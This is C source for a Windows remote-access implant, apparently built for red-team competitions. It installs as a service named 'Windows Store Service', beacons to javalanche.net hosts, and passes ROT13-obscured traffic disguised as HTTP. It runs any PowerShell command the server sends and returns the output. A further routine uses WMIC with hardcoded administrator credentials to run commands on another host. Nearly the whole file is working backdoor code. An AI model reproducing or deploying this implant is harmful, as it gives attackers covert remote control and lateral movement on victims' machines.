#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <process.h>
#include <ws2tcpip.h>
#include <time.h>
#pragma comment(lib,"ws2_32.lib")
#define _CRT_SECURE_NO_WARNINGS

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hStatus;

void ServiceMain(DWORD argc, LPTSTR* argv);
void ControlHandler(DWORD request);

typedef struct otherClient {
    char ip[20];
    char username[30];
    char password[30];
};

static int resolveBeaconServerIPAddr(char* ipAddressBuf) {
    // Return values
    // 0 = Success, ip successfully resolved
    // 1 = WSAStartup could not be initialized
    // 2 = Resolving ip address method failed
    // 3 = No ip addresses could be successfully resolved

    char beacons[5][24] = {
        "beacon1.javalanche.net",
        "beacon2.javalanche.net",
        "beacon3.javalanche.net",
        "beacon4.javalanche.net",
        "beacon5.javalanche.net"
    };
    PSTR resolvedIP = (PSTR)calloc(20, sizeof(PSTR));
    char serverResponse[1024];

    int attemptedTries = 0;

    while (attemptedTries < 25) {
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            return 1;
        }

        // Variables for resolving IP Address
        struct addrinfo hints;
        struct addrinfo* result, * rp;

        // Variable for checking to make sure that functions worked correctly
        int status;

        // Variables for connecting to resolved ip address to ensure connectivity
        struct sockaddr_in resolvedServerAddr;
        SOCKET resolvedClientSocket;

        resolvedClientSocket = socket(AF_INET, SOCK_STREAM, 0);
        if (resolvedClientSocket == -1) {
            perror("Error creating socket");
            exit(-1);
        }

        // Use TCP and IPv4
        memset(&hints, 0, sizeof(hints));
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;

        // Use getaddrinfo to resolve the address.
        status = getaddrinfo(beacons[attemptedTries % 3], NULL, &hints, &result);
        if (status != 0) {
            WSACleanup();
            return 2;
        }

        // Iterate through the results to find the first IPv4 Address
        for (rp = result; rp != NULL; rp = rp->ai_next) {
            struct sockaddr_in* ipv4 = (struct sockaddr_in*)rp->ai_addr;
            void* addr = &(ipv4->sin_addr);

            if (inet_ntop(AF_INET, addr, resolvedIP, 20) != NULL) {
                // We've Successfully resolved the IPv4 address. Store the result in resolvedIP
                // Now, check to make sure that we can connect to this beacon 

                wchar_t wideResolvedIPAddress[16];
                size_t convertedChars = 0;
                mbstowcs_s(&convertedChars, wideResolvedIPAddress, sizeof(wideResolvedIPAddress) / sizeof(wchar_t), resolvedIP, _TRUNCATE);
                resolvedServerAddr.sin_family = AF_INET;
                InetPton(AF_INET, wideResolvedIPAddress, &resolvedServerAddr.sin_addr.s_addr);
                resolvedServerAddr.sin_port = htons(80);

                // Connect to server
                int connectResult = connect(resolvedClientSocket, (struct sockaddr*)&resolvedServerAddr, sizeof(resolvedServerAddr));
                if (connectResult == 0){
                    // connectResult == 0 means that the client was able to connect to the server,
                    // so now we can send a request to the server

                    // NOTE, connectResult !=0, then running WSAGetLastError() with an error of 10013
                    // Means that the ip address has been blocked, this could be used for some interesting
                    // statistics
                    
                    // Send a get request to the server, to see if the client is able to reach this server
                    const char* osMessage = "GET / HTTP/1.1\n";
                    send(resolvedClientSocket, osMessage, strnlen(osMessage, 15), 0);

                    // Receive response from Server
                    for (int i = 0; i < 1024; i++) serverResponse[i] = '\0';
                    int bytesRead = recv(resolvedClientSocket, serverResponse, 1023, 0);
                    serverResponse[bytesRead] = '\0';

                    // Check output from server with the expected output from Server
                    char expectedOutput[] = "<!DOCTYPE html>\r\n<html>\r\n<head>\r\n<title>Javalanche</title>\r\n</head>\r\n<body>\r\n<h1>Welcome to Javalanche</h1>\r\n</body>\r\n</html>\r\n";

                    if (strncmp(serverResponse, expectedOutput, size_t(200))) {
                        // Once we have confirmed that we can communicate with the Server, return this ip address
                        // as the one to reach out to.
                        strcpy_s(ipAddressBuf, rsize_t(20), resolvedIP);
                        freeaddrinfo(result);
                        WSACleanup();
                        return 0;
                    }
                }
            }
        }

        // Failed to resolve an IPv4 address.
        freeaddrinfo(result);
        WSACleanup();
        attemptedTries += 1;
    }
    return 3;
}

static void encrypt(char* plainText) {
    // This function takes a pointer to a string, and rotates the characters by 13
    // Because the Ceaser Cipher we are using is 13 characters, the same cipher can be applied
    // To do both encryption and decryption

    // Build the encrypted String by iterating through each character, and rotating it.
    char* newString = (char*)calloc(1024, sizeof(char));
    for (int i = 0; i < strnlen(plainText, 1024); i++) {
        if ((plainText[i] >= 'a' && plainText[i] <= 'z')) {
            newString[i] = ((plainText[i] - 'a' + 13) % 26) + 'a';
        }
        else if ((plainText[i] >= 'A' && plainText[i] <= 'Z')) {
            newString[i] = ((plainText[i] - 'A' + 13) % 26) + 'A';
        }
        else {
            newString[i] = plainText[i];
        }
    }

    // Replace the the plain text with the cipher text
    strcpy_s(plainText, 1024, newString);

    // Free teh memory allocated to newString
    free(newString);
}

unsigned __stdcall winrmOtherClients(){
    // Allocate memory for client
    otherClient* client1 = (otherClient*)calloc(1, sizeof(struct otherClient));
    strcpy_s(client1->ip, rsize_t(19), "10.0.10.81");
    strcpy_s(client1->username, rsize_t(29), "administrator");
    strcpy_s(client1->password, rsize_t(29), "Password-123456");

    const char* powershellCommand = "New-Item -ItemType file -Path C:\\wmitest.txt";

    // Create command to execute WMIC and run a PowerShell command to get processes
    char* Command = (char*)calloc(500, sizeof(char));
    strcat_s(Command, 500, "wmic /node:");
    strcat_s(Command, 500, client1->ip);
    strcat_s(Command, 500, " /user:");
    strcat_s(Command, 500, client1->username);
    strcat_s(Command, 500, " /password:");
    strcat_s(Command, 500, client1->password);
    strcat_s(Command, 500, " process call create \"powershell.exe -Command \\\"");
    strcat_s(Command, 500, powershellCommand);
    strcat_s(Command, 500, "\\\"\"");

    // Execute the command
    int result = system(Command);

    // Check the result
    if (result == -1) {
        perror("System command failed");
        return 1;
    }

    printf("Command executed successfully\n");
}

unsigned __stdcall sendKeepAlive(SOCKET* clientSocket) {
    SOCKET clientConnection = *clientSocket;
    // Every 30 seconds, send a KEEP_ALIVE message to the server, to keep the socket open
    while (1) {
        // Create KEEP_ALIVE Message and 'encrypt it'
        char keepAlive[1024] = "KEEP_ALIVE\n";
        char message[1200] = "HTTP/1.1 200 OK\r\nContent-Length: 11\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n";
        encrypt(keepAlive);
        strncat_s(message, keepAlive, 12);

        // Choose random interval between 30 and 90 seconds to sleep
        srand(time(NULL));
        int randomTime = 30000 + rand() % (90000 - 30000 + 1);
        Sleep(randomTime);

        // Send KEEP_ALIVE Message
        send(clientConnection, message, strnlen(message, 120), 0);
    }
}

int main(void) {
    // Connect main thread to the service control messanger
    SERVICE_TABLE_ENTRY ServiceTable[] = {
        {(LPWSTR)TEXT("Windows Store Service"), (LPSERVICE_MAIN_FUNCTION)ServiceMain},
        {NULL, NULL}
    };

    if (!StartServiceCtrlDispatcher(ServiceTable)) {
        printf("Failed to Start Service\n");
    }

    return 0;
}

void ServiceMain(DWORD argc, LPTSTR* argv) {
    hStatus = RegisterServiceCtrlHandler(TEXT("MyService"), (LPHANDLER_FUNCTION)ControlHandler);
    if (hStatus == (SERVICE_STATUS_HANDLE)0) {
        // Handle error
        return;
    }

    // Initialize service status
    ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwWin32ExitCode = 0;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    ServiceStatus.dwCheckPoint = 0;
    ServiceStatus.dwWaitHint = 0;

    // Report initial status to SCM
    SetServiceStatus(hStatus, &ServiceStatus);

    // Service initialization code here

    // Report running status when initialization is complete
    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(hStatus, &ServiceStatus);

    /////////////////////////////////////
    //   START OF NON-SERVICE CODE     //
    /////////////////////////////////////

    // Initialize the Socket, and server address variables
    WSADATA sockData;
    SOCKET clientSocket;
    struct sockaddr_in serverAddr;
    memset(&serverAddr, 0, sizeof(serverAddr));

    WSAStartup(MAKEWORD(2, 2), &sockData);

    char serverMessage[1024];
    for (int i = 0; i < 1024; i++) serverMessage[i] = '\0';

    // Create socket
    clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == -1) {
        perror("Error creating socket");
        exit(-1);
    }

    // Set up server address and port
    char serverIPAddress[16];
    int dnsResolveResult = resolveBeaconServerIPAddr(serverIPAddress);
    if (dnsResolveResult != 0) {
        printf("Could not reach a Beacon Server");
        exit(-1);
    }

    wchar_t wideServerIPAddress[16];
    size_t convertedChars = 0;
    mbstowcs_s(&convertedChars, wideServerIPAddress, sizeof(wideServerIPAddress) / sizeof(wchar_t), serverIPAddress, _TRUNCATE);
    serverAddr.sin_family = AF_INET;
    InetPton(AF_INET, wideServerIPAddress, &serverAddr.sin_addr.s_addr);
    serverAddr.sin_port = htons(80);

    // Connect to server
    int result = connect(clientSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr));
    if (result != 0) {
        int error = WSAGetLastError();
        printf("Error Code: %d\n", error);
        exit(error);
    }

    // The first message sent to the Server is the OS
    const char* osMessage = "Windows\n";
    send(clientSocket, osMessage, strnlen(osMessage, 8), 0);

    // The second message sent to the Server is the host address.
    // The host address is needed, as in a traditional red vs blue competition, most of the 
    // Infrastructure is sitting behind NAT, while the Proxy server is publicly acessible.
    // So instead of specifying clients by their Natted IP Address, we'd rather look at thier
    // Private IP address that is unique for that competition
    char host[256];
    char ipstr[INET_ADDRSTRLEN + 2];
    struct addrinfo hints, * res, * p;
    int status;

    // Get the hostname
    gethostname(host, sizeof(host));

    // Set up the hints structure
    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    // Get address information
    status = getaddrinfo(host, NULL, &hints, &res);

    // Loop through all the results and get the first IPv4 address
    for (p = res; p != NULL; p = p->ai_next) {
        void* addr = NULL;
        if (p->ai_family == AF_INET) {
            struct sockaddr_in* ipv4 = (struct sockaddr_in*)p->ai_addr;
            addr = &(ipv4->sin_addr);

            // Convert the IP to a string
            inet_ntop(p->ai_family, addr, ipstr, sizeof ipstr);
            int len = strnlen(ipstr, 16);
            ipstr[len + 1] = '\0';
            ipstr[len] = '\n';
            send(clientSocket, ipstr, strnlen(ipstr, 17), 0);

            // Break after the first IP address is found
            break;
        }
    }

    // Free the linked list
    freeaddrinfo(res);

    // Start a thread to send a keep alive message every 30 seconds to the Server
    HANDLE keepAliveThread = (HANDLE)_beginthreadex(NULL, 0, (_beginthreadex_proc_type)&sendKeepAlive, &clientSocket, 0, NULL);

    // Main service loop
    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING) {
        // Get message from Server
        int bytesRead = recv(clientSocket, serverMessage, 1023, 0);
        serverMessage[bytesRead] = '\0';

        // Because the Connecttion is disguised in HTTP, there are a handful of headers we don't care about.
        // To do this, we just move the pointer past the wherever the substring variable is found
        const char* substring = "charset=utf-8\r\n\r\n";
        char* startOfActualData = strstr(serverMessage, substring);
        startOfActualData += strnlen(substring, 19);
        strcpy_s(serverMessage, sizeof(serverMessage), startOfActualData);

        // Decrypt the Message from the server
        encrypt(serverMessage);
        const char* keepAlive = "KEEP_ALIVE\n";

        // Check to make sure the message isn't a keep alive message
        if (strncmp(serverMessage, keepAlive, 11) != 0) {
            // Create the string to run the command in the format "Powershell.exe -Command /"[cmdlet]/"
            char command[1100] = "Powershell.exe -Command \"";
            strcat_s(command, rsize_t(1100), serverMessage);
            strcat_s(command, rsize_t(1100), "\"");

            // Create variables to run and store command output
            char commandOutput[8192];
            FILE* pipe;

            // Open the command for reading
            pipe = _popen(command, "r");
            if (pipe == NULL) {
                printf("Error opening pipe.\n");
            }

            // Read the output a line and send it back to the Server
            while (fgets(commandOutput, 8190, pipe) != NULL) {
                // fgets appends \0 to the end, but not \n. The next 3 lines overwrite the \0 with \n, and then append \0 after
                encrypt(commandOutput);
                int len = strnlen(commandOutput, 8190);
                commandOutput[len] = '\n';
                commandOutput[len + 1] = '\0';

                // Disguise the command output in an HTTP Header
                char message[8292] = "HTTP/1.1 200 OK\r\nContent-Length: ";
                char messageSize[6];
                sprintf_s(messageSize, "%d", (int)strnlen(commandOutput, 8190));
                strncat_s(message, messageSize, 6);
                char endMessage[46] = "\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n";
                strncat_s(message, endMessage, 46);
                strncat_s(message, commandOutput, 8192);


                send(clientSocket, commandOutput, strnlen(commandOutput, 8192), 0);
            }

            // Close the pipe
            _pclose(pipe);
        }
    }

    // Cleanup and shutdown
    closesocket(clientSocket);
    ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(hStatus, &ServiceStatus);
}

void ControlHandler(DWORD request) {
    switch (request) {
    case SERVICE_CONTROL_STOP:
        ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
        SetServiceStatus(hStatus, &ServiceStatus);

        // Perform cleanup tasks

        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(hStatus, &ServiceStatus);
        return;

    case SERVICE_CONTROL_SHUTDOWN:
        // Handle shutdown tasks
        break;

    default:
        break;
    }
}